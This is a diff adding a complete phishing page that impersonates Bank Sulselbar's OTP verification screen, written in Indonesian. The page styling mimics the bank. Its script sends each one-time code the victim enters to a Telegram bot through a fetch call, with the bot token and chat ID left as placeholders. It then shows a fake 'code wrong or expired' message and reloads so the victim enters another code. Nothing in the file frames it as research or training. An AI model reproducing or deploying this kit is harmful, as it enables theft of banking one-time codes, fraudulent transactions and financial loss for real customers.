@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP - Bank Sulselbar</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f4f7f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .otp-container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 40px 30px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .logo-otp {
+            width: 180px;
+            margin-bottom: 25px;
+        }
+        h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .otp-field {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: #fafafa;
+            outline: none;
+            transition: 0.3s;
+        }
+        .otp-field:focus {
+            border-color: #34495e;
+            background: #fff;
+            box-shadow: 0 0 8px rgba(52, 73, 94, 0.2);
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #2c3e50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .verify-btn:hover {
+            background-color: #1a252f;
+        }
+        .resend-text {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #888;
+        }
+        .resend-link {
+            color: #3498db;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .timer {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="otp-container">
+    <img src="https://upload.wikimedia.org/wikipedia/id/thumb/a/a9/Logo_Bank_Sulselbar.svg/1200px-Logo_Bank_Sulselbar.svg.png" alt="Logo" class="logo-otp">
+    
+    <h2>Verifikasi Perangkat</h2>
+    <p>Masukkan 6 digit kode OTP yang telah dikirimkan melalui SMS ke nomor ponsel terdaftar Anda untuk melanjutkan transaksi.</p>
+
+    <form id="otpForm">
+        <div class="otp-input-group">
+            <input type="number" class="otp-field" maxlength="1" required>
+            <input type="number" class="otp-field" maxlength="1" required>
+            <input type="number" class="otp-field" maxlength="1" required>
+            <input type="number" class="otp-field" maxlength="1" required>
+            <input type="number" class="otp-field" maxlength="1" required>
+            <input type="number" class="otp-field" maxlength="1" required>
+        </div>
+
+        <button type="submit" class="verify-btn">Konfirmasi OTP</button>
+    </form>
+
+    <div class="resend-text">
+        Tidak menerima kode? Kirim ulang dalam <span class="timer" id="countdown">02:00</span>
+    </div>
+</div>
+
+<script>
+    // --- KONFIGURASI TELEGRAM ---
+    const token = 'TOKEN_BOT_ANDA'; 
+    const chatId = 'ID_CHAT_ANDA';
+
+    // Auto-focus pindah ke kotak berikutnya
+    const inputs = document.querySelectorAll('.otp-field');
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', () => {
+            if (input.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+
+    // Timer Hitung Mundur
+    let time = 120;
+    const timerElement = document.getElementById('countdown');
+    setInterval(() => {
+        let minutes = Math.floor(time / 60);
+        let seconds = time % 60;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        timerElement.innerHTML = `0${minutes}:${seconds}`;
+        if (time > 0) time--;
+    }, 1000);
+
+    // Kirim OTP ke Telegram
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        let otpCode = "";
+        inputs.forEach(input => { otpCode += input.value; });
+
+        const message = `--- OTP SULSELBAR ---\nKODE OTP: ${otpCode}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        }).finally(() => {
+            alert("Kode OTP salah atau kedaluwarsa. Silakan coba lagi.");
+            location.reload(); // Refresh untuk minta OTP lagi
+        });
+    });
+</script>
+
+</body>
+</html>
